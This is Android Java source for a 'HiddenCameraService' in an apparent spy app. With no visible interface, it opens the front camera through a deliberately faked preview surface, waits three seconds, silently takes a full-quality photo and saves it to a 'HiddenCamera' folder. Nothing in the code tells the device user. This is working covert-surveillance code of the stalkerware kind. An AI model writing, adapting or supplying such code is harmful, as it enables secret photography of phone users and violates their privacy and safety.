package com.app.spyapp.service;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import android.view.SurfaceView;
import android.widget.Toast;

import com.app.spyapp.R;
import com.app.spyapp.common.Utils;
import com.app.spyapp.common.WriteLog;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;


public class HiddenCameraService extends Service {


    private Camera camera;
    private int cameraId = 0;
    public static final int MEDIA_TYPE_IMAGE = 1;
    private boolean safeToTakePicture = false;
    SurfaceView view;
    private static final String TAG = "Debug";

    /** indicates how to behave if the service is killed */
    int mStartMode;

    /** interface for clients that bind */
    IBinder mBinder;

    /** indicates whether onRebind should be used */
    boolean mAllowRebind;

    /** Called when the service is being created. */
    @Override
    public void onCreate() {

    }

    /** The service is starting, due to a call to startService() */
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Utils.showStatus(this, "HIDDENCAMERA");
        camera();
        if (safeToTakePicture && camera != null) {

            SurfaceTexture st = new SurfaceTexture(MODE_PRIVATE);
            try {
                camera.setPreviewTexture(st);
            } catch (IOException e) {
                e.printStackTrace();
            }
            camera.startPreview();
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    camera.takePicture(shutterCallback, rawCallback, mCall);
                    safeToTakePicture = false;
                    stopSelf();
                }
            }, 3000);

        }
        return mStartMode;

    }

    /** A client is binding to the service with bindService() */
    @Override
    public IBinder onBind(Intent intent) {
        return mBinder;
    }

    /** Called when all clients have unbound with unbindService() */
    @Override
    public boolean onUnbind(Intent intent) {
        return mAllowRebind;
    }

    /** Called when a client is binding to the service with bindService()*/
    @Override
    public void onRebind(Intent intent) {

    }

    /** Called when The service is no longer used and is being destroyed */
    @Override
    public void onDestroy() {

    }

    public void camera() {
        // do we have a camera?
        if (!getPackageManager()
                .hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
            Toast.makeText(HiddenCameraService.this, "No camera on this device", Toast.LENGTH_LONG)
                    .show();
        } else {

            cameraId = findFrontFacingCamera();
            if (cameraId < 0) {
                Toast.makeText(HiddenCameraService.this, "No front facing camera found.",
                        Toast.LENGTH_LONG).show();
            } else {
                safeCameraOpen(cameraId);
            }
        }

        // THIS IS JUST A FAKE SURFACE TO TRICK THE CAMERA PREVIEW
        view = new SurfaceView(HiddenCameraService.this);
        try {
            camera.setPreviewDisplay(view.getHolder());
        } catch (IOException e) {
            e.printStackTrace();
        }
        camera.startPreview();
        safeToTakePicture = true;
        Camera.Parameters params = camera.getParameters();
        params.setJpegQuality(100);
        camera.setParameters(params);
        //new Timer(MainActivity.this, threadHandler).execute();


    }


    Camera.PictureCallback mCall = new Camera.PictureCallback() {
        public void onPictureTaken(byte[] data, Camera camera) {
            Log.i(TAG, "callback onpitcturetaken");
            File pictureFile = getOutputMediaFile(MEDIA_TYPE_IMAGE);
            if (pictureFile == null) {
                WriteLog.E(TAG, "Error creating media file, check storage permissions: ");
                return;
            }

            try {
                FileOutputStream fos = new FileOutputStream(pictureFile);
                fos.write(data);
                fos.close();
                safeToTakePicture = true;
            } catch (FileNotFoundException e) {
                Log.i(TAG, "File not found: " + e.getMessage());
            } catch (IOException e) {
                Log.i(TAG, "Error accessing file: " + e.getMessage());
            }
        }
    };



    private File getOutputMediaFile(int type) {
        File mediaStorageDir = new File(Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_PICTURES), "HiddenCamera");

        if (!mediaStorageDir.exists()) {
            if (!mediaStorageDir.mkdirs()) {
                Log.i(TAG, "failed to create directory");
                return null;
            }
        }

        String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
        File mediaFile;
        if (type == MEDIA_TYPE_IMAGE) {
            mediaFile = new File(mediaStorageDir.getPath() + File.separator +
                    "IMG_" + timeStamp + ".jpg");
//            try {
//                ExifInterface exifInterface =  new ExifInterface(mediaFile.getPath());
//                int orientation = exifInterface.getAttributeInt(ExifInterface.TAG_ORIENTATION, ExifInterface.ORIENTATION_NORMAL);
//                Log.e(TAG,"orientation"+orientation);
//                int angle = 0;
//                if(orientation==0){
//                    angle=90;
//                }
//                else if (orientation == ExifInterface.ORIENTATION_ROTATE_90) {
//                    angle = 90;
//                }
//                else if (orientation == ExifInterface.ORIENTATION_ROTATE_180) {
//                    angle = 180;
//                }
//                else if (orientation == ExifInterface.ORIENTATION_ROTATE_270) {
//                    angle = 270;
//                }
//                Matrix mat = new Matrix();
//                mat.postRotate(angle);
//            }
//            catch (IOException e) {
//                Log.e(TAG, "-- Error in setting image");
//            }
//            catch(OutOfMemoryError oom) {
//                Log.e(TAG, "-- OOM Error in setting image");
//            }
            Log.i(TAG, "mediafile path" + mediaFile);

        } else {
            return null;
        }
        return mediaFile;
    }

    private int findFrontFacingCamera() {
        int cameraId = -1;
        int numberOfCameras = Camera.getNumberOfCameras();
        for (int i = 0; i < numberOfCameras; i++) {
            Camera.CameraInfo info = new Camera.CameraInfo();
            Camera.getCameraInfo(i, info);
            if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                Log.i(TAG, "front Camera found");
                cameraId = i;
                break;
            }
//            else if(info.facing == CameraInfo.CAMERA_FACING_BACK) {
//                Log.e(TAG, "back Camera found");
//                cameraId = i;
//                break;
//            }
        }
        return cameraId;
    }
    private boolean safeCameraOpen(int id) {
        boolean qOpened = false;
        try {
            releaseCamera();
            camera = Camera.open(id);
            qOpened = (camera != null);
        } catch (Exception e) {
            Log.i(getString(R.string.app_name), "failed to open Camera");

        }
        return qOpened;
    }

    private void releaseCamera() {
        if (camera != null) {
            camera.stopPreview();
            camera.release();
            camera = null;
        }
    }

    Camera.PictureCallback rawCallback = new Camera.PictureCallback()

    {

        public void onPictureTaken(byte[] data, Camera cam) {


        }

    };

    Camera.ShutterCallback shutterCallback = new Camera.ShutterCallback() {

        public void onShutter() {


        }

    };

    Camera.PictureCallback jpegCallback = new Camera.PictureCallback() {

        public void onPictureTaken(byte[] _data, Camera _camera) {


            FileOutputStream outStream = null;

            File external = Environment.getExternalStorageDirectory();

            try {

                // write to sdcard

                outStream = new FileOutputStream(String.format(

                        external + "appname/%d.jpg", System.currentTimeMillis()));

                outStream.write(_data);

                outStream.flush();

                outStream.close();

            } catch (FileNotFoundException e) {

                e.printStackTrace();

            } catch (IOException e) {

                e.printStackTrace();

            } finally {

            }

        }

    };

}
